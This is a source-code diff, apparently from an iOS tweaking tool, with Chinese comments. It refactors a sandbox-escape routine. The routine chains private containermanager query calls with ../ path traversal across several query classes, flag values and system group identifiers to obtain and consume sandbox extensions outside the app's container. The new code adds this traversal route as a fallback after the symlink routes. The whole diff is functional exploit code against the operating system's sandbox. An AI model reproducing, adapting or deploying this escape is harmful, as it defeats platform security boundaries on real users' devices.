@@ -264,6 +264,77 @@ static int64_t wq_attempt(uint64_t query_class, uint64_t flags,
     return handle;
 }
 
+// 免符号链接的穿出路线（Vellum bad_query 思路，常量见上面注释）：
+// class 2 / class 7 用自己的组（8 级 ../），class 13 用系统组（7 级 ../），
+// 逐个试到成功。全失败返回最后一条路的负错误码，out 参数记录最后一次尝试。
+// 2026-11-10 朋友 27.2 手机实测：抽屉好好的、class 7 符号链接路三组全被
+// 内核拒发扩展（-6）——这条路不能再只留给"抽屉打不开"的情形。
+static int64_t wq_traverse_routes(NSString *group, NSString *target,
+                                  container_query_create_fn query_create,
+                                  container_query_set_class_fn query_set_class,
+                                  container_query_set_identifiers_fn query_set_group_identifiers,
+                                  container_query_set_flags_fn query_set_flags,
+                                  container_query_set_part_fn query_set_part,
+                                  container_query_set_part_domain_fn query_set_part_domain,
+                                  container_query_get_single_result_fn query_get_single_result,
+                                  container_query_free_fn query_free,
+                                  container_copy_sandbox_token_fn copy_sandbox_token,
+                                  sandbox_extension_consume_fn consume_extension,
+                                  int64_t *out_last_code,
+                                  int *out_last_class, int *out_last_flag_index) {
+    int64_t last = -5;
+    int lastClass = 2, lastIndex = -1;
+    for (int f = 0; f < 2; f++) {
+        uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
+        int64_t h = wq_attempt_traverse(2, flag, 8, group, target,
+                                        query_create, query_set_class, query_set_group_identifiers,
+                                        query_set_flags, query_set_part, query_set_part_domain,
+                                        query_get_single_result, query_free,
+                                        copy_sandbox_token, consume_extension);
+        if (h >= 0) {
+            if (out_last_class) *out_last_class = 2;
+            if (out_last_flag_index) *out_last_flag_index = f;
+            return h;
+        }
+        last = h; lastClass = 2; lastIndex = f;
+    }
+    for (int f = 0; f < 2; f++) {
+        uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
+        int64_t h = wq_attempt_traverse(7, flag, 8, group, target,
+                                        query_create, query_set_class, query_set_group_identifiers,
+                                        query_set_flags, query_set_part, query_set_part_domain,
+                                        query_get_single_result, query_free,
+                                        copy_sandbox_token, consume_extension);
+        if (h >= 0) {
+            if (out_last_class) *out_last_class = 7;
+            if (out_last_flag_index) *out_last_flag_index = 2 + f;
+            return h;
+        }
+        last = h; lastClass = 7; lastIndex = 2 + f;
+    }
+    NSString *kSysIds[2] = { @"systemgroup.com.apple.mobilegestaltcache", @"group.com.apple.PosterBoard" };
+    for (int idIdx = 0; idIdx < 2; idIdx++) {
+        for (int f = 0; f < 2; f++) {
+            uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
+            int64_t h = wq_attempt_traverse(13, flag, 7, kSysIds[idIdx], target,
+                                            query_create, query_set_class, query_set_group_identifiers,
+                                            query_set_flags, query_set_part, query_set_part_domain,
+                                            query_get_single_result, query_free,
+                                            copy_sandbox_token, consume_extension);
+            if (h >= 0) {
+                if (out_last_class) *out_last_class = 13;
+                if (out_last_flag_index) *out_last_flag_index = 4 + idIdx * 2 + f;
+                return h;
+            }
+            last = h; lastClass = 13; lastIndex = 4 + idIdx * 2 + f;
+        }
+    }
+    if (out_last_code) *out_last_code = last;
+    if (out_last_class) *out_last_class = lastClass;
+    if (out_last_flag_index) *out_last_flag_index = lastIndex;
+    return last;
+}
+
 int64_t worse_query_escape2(NSString *target, NSString *group, bool create_dir,
                             bool allow_class2, int64_t *out_last_code,
                             int *out_last_class, int *out_last_flag_index) {
@@ -308,9 +379,6 @@ int64_t worse_query_escape2(NSString *target, NSString *group, bool create_dir,
         return -2; // Failed to resolve a function (unsupported OS)
     }
 
-    int64_t last = -5;
-    int lastClass = 7, lastIndex = -1;
-
     if (!groupRoot && !query_set_part_domain) {
         // 连遍历接口都没有（系统太老），免组的路走不通，按原样报错
         dlclose(mgr);
@@ -321,59 +389,14 @@ int64_t worse_query_escape2(NSString *target, NSString *group, bool create_dir,
     if (!groupRoot) {
         // 免符号链接的路（bad_query 思路）：逐个组合试，哪个成了用哪个。
         // class 2 / class 7 查自己的组标识（8 级穿透），class 13 查系统组（7 级穿透）。
-        for (int f = 0; f < 2; f++) {
-            uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
-            int64_t h = wq_attempt_traverse(2, flag, 8, group, target,
-                                            query_create, query_set_class, query_set_group_identifiers,
-                                            query_set_flags, query_set_part, query_set_part_domain,
-                                            query_get_single_result, query_free,
-                                            copy_sandbox_token, consume_extension);
-            if (h >= 0) {
-                dlclose(mgr);
-                if (out_last_class) *out_last_class = 2;
-                if (out_last_flag_index) *out_last_flag_index = f;
-                return h;
-            }
-            last = h; lastClass = 2; lastIndex = f;
-        }
-        for (int f = 0; f < 2; f++) {
-            uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
-            int64_t h = wq_attempt_traverse(7, flag, 8, group, target,
-                                            query_create, query_set_class, query_set_group_identifiers,
-                                            query_set_flags, query_set_part, query_set_part_domain,
-                                            query_get_single_result, query_free,
-                                            copy_sandbox_token, consume_extension);
-            if (h >= 0) {
-                dlclose(mgr);
-                if (out_last_class) *out_last_class = 7;
-                if (out_last_flag_index) *out_last_flag_index = 2 + f;
-                return h;
-            }
-            last = h; lastClass = 7; lastIndex = 2 + f;
-        }
-        NSString *kSysIds[2] = { @"systemgroup.com.apple.mobilegestaltcache", @"group.com.apple.PosterBoard" };
-        for (int idIdx = 0; idIdx < 2; idIdx++) {
-            for (int f = 0; f < 2; f++) {
-                uint64_t flag = f == 0 ? 0x0000008000000000ULL : 0x0000000800000000ULL;
-                int64_t h = wq_attempt_traverse(13, flag, 7, kSysIds[idIdx], target,
-                                                query_create, query_set_class, query_set_group_identifiers,
-                                                query_set_flags, query_set_part, query_set_part_domain,
-                                                query_get_single_result, query_free,
-                                                copy_sandbox_token, consume_extension);
-                if (h >= 0) {
-                    dlclose(mgr);
-                    if (out_last_class) *out_last_class = 13;
-                    if (out_last_flag_index) *out_last_flag_index = 4 + idIdx * 2 + f;
-                    return h;
-                }
-                last = h; lastClass = 13; lastIndex = 4 + idIdx * 2 + f;
-            }
-        }
+        int64_t h = wq_traverse_routes(group, target,
+                                       query_create, query_set_class, query_set_group_identifiers,
+                                       query_set_flags, query_set_part, query_set_part_domain,
+                                       query_get_single_result, query_free,
+                                       copy_sandbox_token, consume_extension,
+                                       out_last_code, out_last_class, out_last_flag_index);
         dlclose(mgr);
-        if (out_last_code) *out_last_code = last;
-        if (out_last_class) *out_last_class = lastClass;
-        if (out_last_flag_index) *out_last_flag_index = lastIndex;
-        return last;
+        return h;
     }
 
     // 第一轮：class 7，三组 flags 逐个试
@@ -388,7 +411,6 @@ int64_t worse_query_escape2(NSString *target, NSString *group, bool create_dir,
             if (out_last_flag_index) *out_last_flag_index = (int)i;
             return h;
         }
-        last = h; lastClass = 7; lastIndex = (int)i;
     }
 
     // 第二轮：class 2 备用查询（要调用方明确允许，兜 27.3）
@@ -404,14 +426,21 @@ int64_t worse_query_escape2(NSString *target, NSString *group, bool create_dir,
                 if (out_last_flag_index) *out_last_flag_index = (int)i;
                 return h;
             }
-            last = h; lastClass = 2; lastIndex = (int)i;
         }
     }
 
-    dlclose(mgr);
+    // 第三轮：免符号链接穿出（Vellum 走的路）。抽屉开得好好的也可能被
+    // 内核拒发扩展（27.2 朋友手机实测 class 7 三组全 -6），这条路照样走。
+    // 注意 traverse 不需要符号链接，但上面符号链接路可能留了一个在
+    // Library/Caches——无论成败都拆干净。
+    int64_t h3 = wq_traverse_routes(group, target,
+                                    query_create, query_set_class, query_set_group_identifiers,
+                                    query_set_flags, query_set_part, query_set_part_domain,
+                                    query_get_single_result, query_free,
+                                    copy_sandbox_token, consume_extension,
+                                    out_last_code, out_last_class, out_last_flag_index);
     clean_symlink(group);
-    if (out_last_code) *out_last_code = last;
-    if (out_last_class) *out_last_class = lastClass;
-    if (out_last_flag_index) *out_last_flag_index = lastIndex;
-    return last;
+    dlclose(mgr);
+    if (h3 < 0 && out_last_code) *out_last_code = h3;
+    return h3;
 }
